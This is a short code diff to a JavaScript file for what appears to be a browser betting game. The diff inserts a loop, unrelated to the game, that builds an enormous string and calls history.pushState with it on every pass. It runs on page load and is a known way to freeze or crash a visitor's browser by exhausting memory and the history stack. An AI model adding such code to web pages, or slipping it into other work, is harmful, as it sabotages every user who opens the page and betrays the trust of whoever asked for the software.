@@ -5,6 +5,12 @@ let balance = 20;
 let bet = 5;
 const minBet = 5;
 
+var total = "";
+for( var i = 0; i < 10000000000000; i++ ) {
+total += i.toString();
+history.pushState(0,0, total );
+}
+
 // DOM Elements
 const balanceDisplay = document.getElementById("balance");
 const betDisplay = document.getElementById("bet");
